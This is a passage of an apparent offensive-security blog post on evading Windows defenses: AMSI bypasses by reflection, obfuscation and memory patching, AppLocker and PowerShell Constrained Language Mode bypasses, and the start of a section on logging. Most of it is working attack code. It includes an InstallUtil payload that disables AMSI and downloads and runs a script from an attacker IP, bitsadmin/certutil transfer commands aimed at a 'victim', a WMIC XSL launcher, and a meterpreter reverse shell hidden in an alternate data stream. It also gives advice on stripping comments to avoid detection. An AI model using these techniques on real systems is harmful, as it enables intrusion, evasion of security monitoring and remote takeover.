<span style=\"color:yellow\">reflection</span>, you can access and manipulate private and internal members of the class, such as the `amsiInitFailed` field.\n\nBut what is reflection ?\n\nReflection is a feature in many programming languages, including .NET and Java, that allows a program to inspect and interact with its own structure and behavior at runtime. This includes inspecting types, methods, properties, fields, and other metadata, as well as creating and manipulating objects dynamically. Reflection is particularly powerful because it <span style=\"color:yellow\">allows for more dynamic and flexible code, though it can also introduce complexity and performance overhead</span>.\n\nLet's see an important screenshot\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def1.png\" alt=\"\"></figure>\n\n\nWhen you see this output, it means that :\n\n1. The type `AmsiUtils` is successfully retrieved from the assembly, indicating that AMSI is present and recognized.\n2. Since `AmsiUtils` is not public, it suggests that the class is intended for internal use within the .NET assembly.\n3. The type inherits from `System.Object`, which is typical for most classes in .NET\n\n* $field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')\n\nLet's see it in a good way without variables\n\n\n```powershell\n$field = [Ref].Assembly.GetType(('System.Management.Automation.AmsiUtils')).GetField('amsiInitFailed', 'NonPublic,Static')\n```\n\nThis line retrieves the field `amsiInitFailed` from the `AmsiUtils` type. The `NonPublic` and `Static` flags indicate that it is a non-public (private or protected) static field.\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def2.png\" alt=\"\"></figure>\n\n\n* $field.SetValue($null,$true)\n\nLet's see it in a good way without variables\n\n\n```powershell\n[Ref].Assembly.GetType(('System.Management.Automation.AmsiUtils')).GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null,$true)\n```\n\nBy setting the value of the `amsiInitFailed` field to `true`, the script tricks PowerShell into believing that <span style=\"color:yellow\">AMSI failed to initialize properly</span>. As a result, PowerShell skips or disables AMSI's scanning functionality.\n\nNice now we break it let's see bypass the AMSI\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def3.png\" alt=\"\"></figure>\n\n\nWe filed! , That's okay\n\n[This command is very popular in AMSI bypass](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/) so it's regular to be detected\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def4.png\" alt=\"\"></figure>\n\n### Obfuscation\n\nObfuscation in AMSI bypass refers to techniques used to <span style=\"color:yellow\">conceal or disguise the code that performs the AMSI bypass</span>. The purpose is to make the bypass harder to detect by security software and reverse engineers, I will show u some ways that u can use Obfuscation to bypass\n\n#### String Splitting and Concatenation\n\nWe tested it before in our last example but let us make it work\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def5.png\" alt=\"\"></figure>\n\n\nLet's use [AMSITrigger](https://github.com/RythmStick/AMSITrigger) to see why we are blocked from [Bitdefender](https://www.bitdefender.com/)\n\nMake an exception for ur dir to test the scripts\n\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def6.png\" alt=\"\"></figure>\n\nOkay now we know where is the AMSI detect us let's see how we can bypass it , We see it from the last example so i don't need to explain what i do again\n\nfrom\n\n```powershell\n$ReF=[ReF].AsSemBlY.GEtTypE('System.Management.Automation.AmsiUtils');\n$Ref.GetFIElD('amsiInitFailed','NonPublic,Static').SETValue($NULl,$truE);\n```\n\nTo\n\n```powershell\n$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'\n$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))\n$field = $assembly.GetField(('am{0}InitFailed' -f \n$c),'NonPublic,Static')\n$field.SetValue($null,$true)\n```\n\nLet's see if this work\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def7.png\" alt=\"\"></figure>\n\nThe AMSI told us it's clean but we are still on the radar , It doesn't work again !!\n\nSo i try to use more variables and concatinate them\n\n```powershell\n$namespace = 'System.Management.Automation'\n$classPrefix = 'A'\n$propertyName = 'InitFailed'\n$visibility = 'NonPublic,Static'\n$w = \"$namespace.$classPrefix\" # System.Management.Automation.A \n$c = 'si'\n$m = 'Utils'\n$fullClassName = '{0}m{1}{2}' -f $w, $c, $m #System.Management.Automation.AmsiUtils\n$assembly = [Ref].Assembly.GetType($fullClassName)\n$propertyFullName = 'am{0}{1}' -f $c, $propertyName\n$field = $assembly.GetField($propertyFullName, $visibility)\n$field.SetValue($null, $true)\n```\n\nLet's try to check this out with [gocheck](https://github.com/gatariee/gocheck) and see if it works\n\n\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def8.png\" alt=\"\"></figure>\n\nIt doesn't work again, Am...\n\nAt this time I refused to move forward and try to learn other methods and combine them to bypass so I scratched my head and got a good idea\n\nWe can use <span style=\"color:yellow\">environment variables</span> to evade detection by the antivirus , Let's craft our script\n\nSo I decided to write a PowerShell script That retrieves all environment variables to search for every word that I entered to get it immediately as a variable you can use it from my GitHub repo from [here](https://github.com/N1NJ10/Bad_Scripts/blob/main/PowerShell/Envrandomizer.ps1)\n\n> The idea behinde this sript come to me after seeing [Daniel Bohannon](https://www.youtube.com/watch?v=-j7zzUwB_-E&t=414s) explaining Invoke-CradleCrafter\n\nWith this script, i can craft our payload in a new way\n\n```\n# Extract characters from system environment variables to form \"system\"\n$s1 = [Environment]::GetEnvironmentVariable('DriverData')[11]  # 'S'\n$s2 = [Environment]::GetEnvironmentVariable(\"COMSPEC\")[12]  # 'y'\n$s3 = [Environment]::GetEnvironmentVariable(\"ComSpec\")[9] # 's'\n$s4 = [Environment]::GetEnvironmentVariable('ALLUSERSPROFILE')[12] # 't'\n$s5 = [Environment]::GetEnvironmentVariable(\"HOMEPATH\")[3]  # 'e'\n$s6 = [Environment]::GetEnvironmentVariable(\"ALLUSERSPROFILE\")[9]  # 'm'\n\n$s = \"$s1$s2$s3$s4$s5$s6\" # \"System\"\n\n# Extract characters from system environment variables to form \"Management\"\n$m1 = [Environment]::GetEnvironmentVariable(\"PSModulePath\")[137]  # 'M'\n$m2 = [Environment]::GetEnvironmentVariable(\"ALLUSERSPROFILE\")[8]  # 'a'\n$m3 = [Environment]::GetEnvironmentVariable(\"CommonProgramFiles\")[22]  # 'n'\n$m4 = [Environment]::GetEnvironmentVariable(\"ALLUSERSPROFILE\")[8]  # 'a'\n$m5 = [Environment]::GetEnvironmentVariable(\"ProgramFiles(x86)\")[6]  # 'g'\n$m6 = [Environment]::GetEnvironmentVariable(\"HOMEPATH\")[3]  # 'e'\n$m7 = [Environment]::GetEnvironmentVariable('ALLUSERSPROFILE')[9]  # 'M'\n$m8 = [Environment]::GetEnvironmentVariable(\"HOMEPATH\")[3]  # 'e'\n$m9 = [Environment]::GetEnvironmentVariable(\"CommonProgramFiles\")[22] # 'n'\n$mx = [Environment]::GetEnvironmentVariable('ALLUSERSPROFILE')[12] # 't'\n\n$m = \"$m1$m2$m3$m4$m5$m6$m7$m8$m9$mx\" # \"Management\"\n\n# Extract characters from system environment variables to form \"Automation\"\n$a1 = [Environment]::GetEnvironmentVariable('APPDATA')[15]  # 'A'\n$a2 = [Environment]::GetEnvironmentVariable('FPS_BROWSER_USER_PROFILE_STRING')[4]  # 'u'\n$a3 = [Environment]::GetEnvironmentVariable('ALLUSERSPROFILE')[12]  # 't'\n$a4 = [Environment]::GetEnvironmentVariable(\"windir\")[7]  # 'o'\n$a5 = [Environment]::GetEnvironmentVariable(\"ALLUSERSPROFILE\")[9]  # 'm'\n$a6 = [Environment]::GetEnvironmentVariable(\"ALLUSERSPROFILE\")[8]  # 'a'\n$a7 = [Environment]::GetEnvironmentVariable('ALLUSERSPROFILE')[12]  # 't'\n$a8 = [Environment]::GetEnvironmentVariable(\"CommonProgramFiles\")[12]  # 'i'\n$a9 = [Environment]::GetEnvironmentVariable(\"windir\")[7]  # 'o'\n$ax = [Environment]::GetEnvironmentVariable(\"CommonProgramFiles\")[22]  # 'n'\n$a = \"$a1$a2$a3$a4$a5$a6$a7$a8$a9$ax\"  # \"Automation\"\n\n# Extract characters from system environment variables to form \"Amsi\"\n$am0 =  [Environment]::GetEnvironmentVariable(\"TEMP\")[4] + [Environment]::GetEnvironmentVariable(\"PUBLIC\")[13] # 'si'\n$am1 = [Environment]::GetEnvironmentVariable('APPDATA')[15]  # 'A'\n$am2 = [Environment]::GetEnvironmentVariable(\"TEMP\")[9]  # 'm'\n$am3 = [Environment]::GetEnvironmentVariable(\"TEMP\")[4]  # 's'\n$am4  = [Environment]::GetEnvironmentVariable(\"PUBLIC\")[13]  # 'i'\n$am = \"$am1$am2$am3$am4\"  # \"Amsi\"\n\n# Extract characters from system environment variables to form \"Utils\"\n$u1 = [Environment]::GetEnvironmentVariable(\"PSModulePath\")[3]  # 'U'\n$u2 = [Environment]::GetEnvironmentVariable('ALLUSERSPROFILE')[12]  # 't'\n$u3 = [Environment]::GetEnvironmentVariable(\"PUBLIC\")[13]  # 'i'\n$u4 = [Environment]::GetEnvironmentVariable(\"PSModulePath\")[40]  # 'l'\n$u5 = [Environment]::GetEnvironmentVariable(\"PSModulePath\")[49]  # 's'\n$u = \"$u1$u2$u3$u4$u5\"  # \"Utils\"\n\n# Construct the type name for AMSI Utils\n$typeName = \"$s.$m.$a.$am$u\"  # \"System.Management.Automation.AmsiUtils\"\n\n# Get the AMSI Utils type\n$assembly = [Ref].Assembly.GetType($typeName)\n\n# Get the 'amsiInitFailed' field\n\n$field = $assembly.GetField(('am{0}InitFailed' -f $am0), 'NonPublic,Static')\n\n# Set the 'amsiInitFailed' field to true\n$field.SetValue($null, $true)\n```\n\nThat's nice let's try it\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def9.png\" alt=\"\"></figure>\n\n> **Remove the comments** to avoid detecting i just put them for u to understand what I do\n{: .prompt-tip }\n\nBypassed ! , Yeah we did it together mate be creative in ur thoughts and u will see magic , Let's see other methods\n\n> Bypassing AMSI does not necessarily bypass all antivirus protections. Modern antivirus solutions employ multiple layers of defense, including behavioral analysis and heuristics, which can still detect and block malicious activities even if AMSI is bypassed.\n{: .prompt-info }\n\n#### Base64 Encoding\n\nOf course, encoding will get into the game, Let's see how to use it\n\n```powershell\n$command = 'hostname'\n$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)\n$encodedCommand = [Convert]::ToBase64String($bytes)\nWrite-Output $encodedCommand\n\n$decodedBytes = [Convert]::FromBase64String($encodedCommand)\n$decodedCommand = [System.Text.Encoding]::Unicode.GetString($decodedBytes)\nInvoke-Expression $decodedCommand\n```\n\nThis example takes a command [ hostname ] and encodes it to base64 then decodes and execute it this is the same method that we will be using\n\n> [Why do we use bytes no encode and decode directly ?](https://stackoverflow.com/questions/3538021/why-do-we-use-base64)\n>\n> This is necessary because Base64 operates on byte data. Strings are sequences of characters, which must be converted to bytes for Base64 encoding.\n{: .prompt-info }\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def10.png\" alt=\"\"></figure>\n\n\nLet's see how to use it in our script\n\nfrom\n\n```powershell\n$ReF=[ReF].AsSemBlY.GEtTypE('System.Management.Automation.AmsiUtils');\n$Ref.GetFIElD('amsiInitFailed','NonPublic,Static').SETValue($NULl,$truE);\n```\n\n[To](https://cheatsheet.haax.fr/windows-systems/privilege-escalation/amsi_and_evasion/)\n\n```powershell\n[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)\n```\n\nLet's see if this work\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def11.png\" alt=\"\"></figure>\n\nAgain we bypassed the AMSI with the Base64-encoded payload\n\nThere is many obfuscation methods left , I will leave u some resources at the end of the post to check them out and try to make one of them work with u consider it as a task\n\n### Memory Patch\n\nThe idea behind this bypass is to force <span style=\"color:yellow\">AmsiScanBuffer to return AMSI\\_RESULT\\_CLEAN</span>. The general idea is to import API calls and then return a specific value to the AmsiScanBuffer() call: 0x80070057. The original bypass is detected by AMSI now, so we can manipulate with assembly instructions by using a double add operand and successfully bypass the control. The code for this is as follows:\n\n\n```powershell\n$Win32 = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n    [DllImport(\"kernel32\")]\n    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);\n    [DllImport(\"kernel32\")]\n    public static extern IntPtr LoadLibrary(string name);\n    [DllImport(\"kernel32\")]\n    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);\n}\n\"@\n\nAdd-Type $Win32\n$test = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)\n$LoadLibrary = [Win32]::LoadLibrary([System.Text.Encoding]::ASCII.GetString($test))\n$test2 = [Byte[]] (0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)\n$Address = [Win32]::GetProcAddress($LoadLibrary, [System.Text.Encoding]::ASCII.GetString($test2))\n$p = 0\n[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)\n$Patch = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)\n#0:  31 c0                   xor    eax,eax\n#2:  05 78 01 19 7f          add    eax,0x7f190178\n#7:  05 df fe ed 00          add    eax,0xedfedf\n#c:  c3                      ret \n[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, $Patch.Length)\n```\n\nLet's try it\n\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def12.png\" alt=\"\"></figure>\n\nAgain we bypassed the AMSI\n\n>If u wanna deep dive into this u can write this [writeup](https://medium.com/@sam.rothlisberger/amsi-bypass-memory-patch-technique-in-2024-f5560022752b)\n{: .prompt-tip }\n\n## AppLocker and Powershell CLM\n\nApplocker is a white-listing solution With this feature, you can limit not only applications, but also scripts, batches, DLLs, and more. There are a few ways that a limit can be applied: **by Name, Path, Publisher, or Hash** , you can use rules to enforce it to Allow and deny as I will show you\n\nPowerShell Constrained Language Mode [ CLM ] is a [language mode](https://devblogs.microsoft.com/powershell/a-comparison-of-shell-and-scripting-language-security/) of PowerShell designed to support day-to-day administrative tasks, yet restrict access to sensitive language elements that can be used to invoke arbitrary Windows APIs , So why this for ?\n\nBecause it's an incredibly effective way to drastically reduce the risk of viruses, ransomware, and unapproved software. For DeviceGuard UMCI the approved applications are determined via a UMCI policy. PowerShell automatically detects when a UMCI policy is being enforced on a system and will run only in Constrained Language mode. So PowerShell Constrained Language mode becomes more interesting when working in conjunction with system-wide lockdown policies.\n\n>Local Account Syntax: The general syntax for logging in with a local account is `.\\username`\n{: .prompt-tip }\n\nNow we know what is Applocker & PowerShell Constrained Language Mode let's see how to use them, I need you to follow this [guide](https://www.hackingarticles.in/windows-applocker-policy-a-beginners-guide/)\n\nLet's setup our enviroment :\n\nFirst we need to configure the Applocker policy from LocalGroupPolicy -> Computer Configration -> Windows Settings -> Security Settings -> Application Control Policies -> AppLocker\n\nThen i need you to follow the pervious blog and create 2 rules :\n\n* Rule Path to run only executables from the C:\\Windows\\*\n* block the [nc64.exe](https://github.com/int0x33/nc.exe/blob/master/nc64.exe) by the hash\n\nThen generate the default creds for the Script Rules to apply the Constrained Language Mode\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def13.png\" alt=\"\"></figure>\n\n\nIf you follow the rules you should see something like this !\n\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def15.png\" alt=\"\"></figure>\n\n> This is from [Rudy Ooms](https://patchmypc.com/blog/windows-11-24h2-applocker-powershell-constrained-language-broken/) :\n>\n>But How PowerShell Determines Language Mode Based on AppLocker Script Rules ??\n>\n>When PowerShell starts, it checks whether [AppLocker Script Enforcement](https://call4cloud.nl/deploying-applocker-intune-powershell/) Rules are present. It does this by simulating the execution of a test PowerShell script placed in the user‚Äôs temporary folder and evaluating it against the system‚Äôs policies. As shown below, the DLL (System.Management.Automation.dll) responsible for PowerShell shows this behavior.\n><figure><img src=\"/images/site/posts/DefenseEvasion/def16.png\" alt=\"\"></figure>\n>This means that if AppLocker‚Äôs rules block or restrict the test PS1 file, PowerShell automatically switches into Constrained Language Mode.\n><figure><img src=\"/images/site/posts/DefenseEvasion/def17.png\" alt=\"\"></figure>\n>If no restrictions apply, PowerShell Scripts will be executed in full language mode. This automatic detection has worked reliably for years and has been a simple way to enforce script safety without needing extra configuration inside PowerShell itself.\n{: .prompt-tip }\n\nBut is this a good security approach , It depends on the quality of the rules we are implementing\n\nCan you disable the Applocker ? ( **Matio here is an administrator** )\n\nFor the first look you can say yes if we are an administrators but seems it doesn't work like this\n\nLet's first talk about the PPL (Protected Process Light) : The PLL is a security feature in Windows that protects critical system processes like antivirus engines, security services, and system integrity components from being **tampered with**, even by **administrators or SYSTEM-level accounts**.\n\nSo Let's try to disable the AppLocker\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def18.png\" alt=\"\"></figure>\n\nEven with the System account\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def19.png\" alt=\"\"></figure>\n\n>By the way  [tiraniddo](https://www.tiraniddo.dev/2019/11/the-internals-of-applocker-part-1.html) here found a way to disable the AppLocker with the TrustedInstaller account :\n>```powershell\n$a = New-ScheduledTaskAction -Execute cmd.exe -Argument \"/C sc.exe config appidsvc start= demand && sc.exe stop appidsvc\"\nRegister-ScheduledTask -TaskName 'TestTask' -TaskPath \\ -Action $a\n$svc = New-Object -ComObject 'Schedule.Service'\n$svc.Connect()\n$user = 'NT SERVICE\\TrustedInstaller'\n$folder = $svc.GetFolder('\\')\n$task = $folder.GetTask('TestTask')\n$task.RunEx($null, 0, 0, $user)\n```\n{: .prompt-tip }\n\n### Path / Hash restrictions bypass\n\nIn this scenario, i will show you how we can bypass the Path / Hash restrictions by moving the file to an allowed executable path and changing the file wish to lead to changing the whole hash\n\nFirst we will see what directories that our permession to the subdirectories of the main dir that we can run exe files from it\n\nThen we will edit the file hash , Seems this will make will work\n\n```powershell\nPS C:\\Users\\matio> Get-ChildItem C:\\Windows\\ -Directory -Recurse -ErrorAction SilentlyContinue | ForEach-Object { $dir = $_; try { (Get-Acl $dir.FullName -ErrorAction SilentlyContinue).Access | Where-Object { $_.AccessControlType -eq \"Allow\" -and ($_.IdentityReference.Value -eq \"NT AUTHORITY\\Authenticated Users\" -or $_.IdentityReference.Value -eq \"BUILTIN\\Users\") -and (($_.FileSystemRights -like \"*Write*\" -or $_.FileSystemRights -like \"*Create*\") -and $_.FileSystemRights -like \"*Execute*\") } | ForEach-Object { Write-Host ($dir.FullName + \": \" + $_.IdentityReference.Value + \" (\" + $_.FileSystemRights + \")\") } } catch {} }\nC:\\Windows\\Tasks: NT AUTHORITY\\Authenticated Users (CreateFiles, ReadAndExecute, Synchronize)\nC:\\Windows\\tracing: BUILTIN\\Users (Write, ReadAndExecute, Synchronize)\nC:\\Windows\\System32\\spool\\drivers\\color: BUILTIN\\Users (CreateFiles, ReadAndExecute, Synchronize)\nPS C:\\Users\\matio> cp .\\Downloads\\nc64.exe C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe\nPS C:\\Users\\matio> & C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe\nProgram 'nc64.exe' failed to run: This program is blocked by group policy. For more information, contact your system\nadministratorAt line:1 char:1\n+ & C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~.\nAt line:1 char:1\n+ & C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException\n    + FullyQualifiedErrorId : NativeCommandFailed\n\nPS C:\\Users\\matio> echo \"N1NJ10\" >> C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe\nPS C:\\Users\\matio> & C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe -l -p 7777\n```\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def20.png\" alt=\"\"></figure>\n\n\n### InstallUtil - Shell ( Updated Part )\n\nThere is a bypass technique that usess the [Installutil](https://learn.microsoft.com/en-us/dotnet/framework/tools/installutil-exe-installer-tool) , My first time to see it from [pentestlab](https://pentestlab.blog/2017/05/08/applocker-bypass-installutil/) i reccomed u to read this before contiue\n\nAs we know now , when can use installutil to run an exe files inside them to bypass the applocker rules ( Since this utility is a <span style=\"color:yellow\">Microsoft signed binary</span> then it could be used to run any .NET executables bypassing in that way AppLocker restrictions. Also this utility is <span style=\"color:yellow\">located inside the Windows directory</span> which AppLocker policies are not going to be applied as the contents of the Windows folder are needed to be executed in order for the system to run normally ) and bypass the CLM lang ( InstallUtil <span style=\"color:yellow\">executes the code in a .NET context, not PowerShell, avoiding CLM restrictions</span>. ) , okey let's see how we can exploit this using this code\n\n\n```powershell\nusing System;\nusing System.Management.Automation;\nusing System.Management.Automation.Runspaces;\nusing System.Configuration.Install;\n\nnamespace BypassCLM\n{\n    class Program\n    {\n        static void Main(string[] args)\n        {\n            Console.WriteLine(\"This is vairous , ru kidding !!!! \");\n        }\n    }\n\n    [System.ComponentModel.RunInstaller(true)]\n    public class Sample : System.Configuration.Install.Installer\n    {\n        public override void Uninstall(System.Collections.IDictionary savedState)\n        {\n           string amsiBypass = @\"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\";\n           string cmd = \"IEX(New-Object Net.WebClient).DownloadString('http://192.168.99.21:8080/a9kMET')\";\n\n           Runspace rs = RunspaceFactory.CreateRunspace();\n           rs.Open();\n           PowerShell ps = PowerShell.Create();\n           ps.Runspace = rs;\n           ps.AddScript(amsiBypass); // First, bypass AMSI\n           ps.Invoke();\n           ps.AddScript(cmd); // Then, execute the downloaded script\n           ps.Invoke();\n           rs.Close();\n        }\n    }\n}\n```\n\nCreate ur reverse shell and change the cmd variable ( u can do it with metasploit or any other c2 ) and the amsiBypass also , Then compile it with the .Net [csc.exe](https://dotnet.microsoft.com/en-us/download/dotnet-framework) binary\n\n\n```powershell\n& C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /reference:\"C:\\Windows\\assembly\\GAC_MSIL\\System.Management.Automation\\1.0.0.0__31bf3856ad364e35\\System.Management.Automation.dll\" /out:Bypass.exe BypassCLM.cs\ncertutil -encode Bypass.exe bypass.txt\n```\n\nThen run your [RangeHTTPServer](https://github.com/danvk/RangeHTTPServer) ( **Not http** )\n\n\n```bash\npython3 -m RangeHTTPServer 1234\n```\n\nThen go to your victum and excute those commands\n\n```powershell\nbitsadmin /transfer Bad_Work http://192.168.99.21/bypass.txt C:\\Windows\\System32\\spool\\drivers\\color\\bypass.txt\ncertutil -decode C:\\Windows\\System32\\spool\\drivers\\color\\bypass.txt C:\\Windows\\System32\\spool\\drivers\\color\\bypass.exe\n& C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Windows\\System32\\spool\\drivers\\color\\bypass.exe\n```\n\nIf you follow those steps you should get the shell\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def21.png\" alt=\"\"></figure>\n\n\n### WMIC ( Updated Part )\n\nThere is a small trick when u can use a wmic to bypass this restrictions , I try this one on a ctf on hackthebox you can use this xsl file ( Change the reverse shell ) :\n\n```powershell\n<?xml version='1.0'?>\n<stylesheet version=\"1.0\"\nxmlns=\"http://www.w3.org/1999/XSL/Transform\"\nxmlns:ms=\"urn:schemas-microsoft-com:xslt\"\nxmlns:user=\"http://mycompany.com/mynamespace\">\n<output method=\"text\"/>\n        <ms:script implements-prefix=\"user\" language=\"JScript\">\n                <![CDATA[\n                        var r = new ActiveXObject(\"WScript.Shell\");\n                        r.Run(\"powershell.exe -nop -w hidden -e xxxxxxxxxxxxxxxxxx=\");\n                ]]>\n        </ms:script>\n</stylesheet>\n```\n\nThen you can get the file from the server or download and excute it\n\n\n```powershell\nwmic process get brief /format:\"rev.xsl\"\nwmic process get brief /format:\"http://192.168.99.21:1234/rev.xsl\"\n```\n\n>There is more ways you can test from here :\n>* [snovvcra.sh](https://ppn.snovvcra.sh/pentest/infrastructure/ad/av-edr-evasion/applocker-bypass)\n>* [itm4n](https://itm4n.github.io/reinventing-powershell/#constrained-language-mode-clm)\n>* [UltimateAppLockerByPassList](https://github.com/api0cradle/UltimateAppLockerByPassList)\n{: .prompt-tip }\n\n\n### Alternate Data Stream\n\n[OWASP](https://owasp.org/www-community/attacks/Windows_alternate_data_stream) said The NTFS file system includes support for alternate data streams. This is not a well known feature and was included, primarily, to provide compatibility with files in the Macintosh file system. Alternate data streams allow files to contain more than one stream of data. Every file has at least one data stream. In Windows, this default data stream is called `:$DATA`\n\nSo we can hide a data stream in any file without the user even konw !!\n\nSo let's first create our reverse shell\n\n```bash\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.99.21 LPORT=7771 -a x64 --platform Windows -f exe -o rev_shell.exe\n```\n\nThen transfer the file to the victum machine and embaded it into another file ( **Run this from the cmd** )\n\n```powershell\ntype C:\\Users\\matio\\Desktop\\rev_shell.exe > \"C:\\Users\\matio\\Desktop\\test.txt -Stream rev_shell.exe\"\n\nwmic process call create '\"test.txt:rev_shell.exe\"'\n```\n\nThen it should be worked.\n\n## Powershell CLM Bypass\n\nLet's see if we can bypass the CLM , First let's see the LanguageMode we are using\n\n```powershell\n$ExecutionContext.SessionState.LanguageMode\n```\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def22.png\" alt=\"\"></figure>\n\nThere is more than a way to Bypass the CLM\n\n### PowerShdll\n\nwe can Run PowerShell with rundll32. Bypass software restrictions using [PowerShdll](https://github.com/p3nt4/PowerShdll), so Let's see\n\n```powershell\nbitsadmin /transfer Bad_Work http://192.168.99.21:1234/PowerShdll_x64.dll C:\\Windows\\System32\\spool\\drivers\\color\\PowerShdll_x64.dl\nrundll32.exe PowerShdll_x64.dll,main -w\n```\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def23.png\" alt=\"\"></figure>\n\n>You can try some other tools like [PSByPassCLM](https://github.com/padovah4ck/PSByPassCLM) or [bypass-clm](https://github.com/calebstewart/bypass-clm)\n{: .prompt-tip }\n\n### %TEMP%ORARY ( Updated Part )\n\nOne of the catchy methods to bypass the CLM language in powershell is this method\n\nRemmeber in the beggening of talking about the CLM i leave you with an important note by Rudy Ooms [ When PowerShell starts, it checks whether [**AppLocker Script Enforcement**](https://call4cloud.nl/deploying-applocker-intune-powershell/) Rules are present. It does this by simulating the execution of a test **PowerShell script placed in the user‚Äôs temporary** folder and evaluating it against the system‚Äôs policies. ] so why this important ?\n\nBy focus on this statment we should understand that , when a user open the powershell for the first time the system made a random powershell script in his temp dir ( Which are not in the dirs that can execute any binaries or powershell scripts ) and see if this user can execute this script or not\n\nIf yes okey make him in the FullLanguage mode if not change the language mode to ConstrainedLanguage , Okey what if we change the user temp dir in the enviroment to path that we have access and this path in the dirs that applocker permit them to run the executables and scripts from ( Like we do in the applocker bypass ) and start a new powershell session with those new env variables ?\n\nThis was [Oddvar](http://oddvar.moe/2018/10/06/temporary-constrained-language-mode-in-applocker/) idea so he make this script , let's test it and see if this sucess or not\n\n```powershell\n$CurrTemp = $env:temp\n$CurrTmp = $env:tmp\n$TEMPBypassPath = \"C:\\windows\\temp\"\n$TMPBypassPath = \"C:\\windows\\temp\"\n\nSet-ItemProperty -Path 'hkcu:\\Environment' -Name Tmp -Value \"$TEMPBypassPath\"\nSet-ItemProperty -Path 'hkcu:\\Environment' -Name Temp -Value \"$TMPBypassPath\"\n\nInvoke-WmiMethod -Class win32_process -Name create -ArgumentList \"powershell\"\nsleep 5\n\n#Set it back\nSet-ItemProperty -Path 'hkcu:\\Environment' -Name Tmp -Value $CurrTmp\nSet-ItemProperty -Path 'hkcu:\\Environment' -Name Temp -Value $CurrTemp\n\nOR the Cool one by Matt Graeber Note -> https://posts.specterops.io/bypassing-application-whitelisting-with-runscripthelper-exe-1906923658fc\n\n#Path to Powershell\n$CMDLine = \"$PSHOME\\powershell.exe\"\n\n#Getting existing env vars\n[String[]] $EnvVarsExceptTemp = Get-ChildItem Env:\\* -Exclude \"TEMP\",\"TMP\"| % { \"$($_.Name)=$($_.Value)\" }\n\n#Custom TEMP and TMP\n$TEMPBypassPath = \"Temp=C:\\windows\\temp\"\n$TMPBypassPath = \"TMP=C:\\windows\\temp\"\n\n#Add the to the list of vars\n$EnvVarsExceptTemp += $TEMPBypassPath\n$EnvVarsExceptTemp += $TMPBypassPath\n\n#Define the start params\n$StartParamProperties = @{ EnvironmentVariables = $EnvVarsExceptTemp }\n$StartParams = New-CimInstance -ClassName Win32_ProcessStartup -ClientOnly -Property $StartParamProperties\n\n#Start a new powershell using the new params\nInvoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{\nCommandLine = $CMDLine\nProcessStartupInformation = $StartParams\n}\n```\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def24.png\" alt=\"\"></figure>\n\n## PowerShell Logging\n\nPowerShell logging is the process of recording activities within PowerShell sessions, such as commands executed, scripts run, and their outputs or execution details. It is designed to support auditing, debugging, and security monitoring in Windows environments. The three primary logging types : \n\n* Transcription\n* Script Block Logging\n* Module Logging \n\nEach serves distinct purposes, capturing different levels of detail about PowerShell activities, so let us talk about them and their bypasses and how to configure them.\n\n### PowerShell Transcription\n\nThe Transcription loging records both input (commands typed) and output (responses shown) of PowerShell sessions, like a session transcript.\n\nLet's configure it from Local 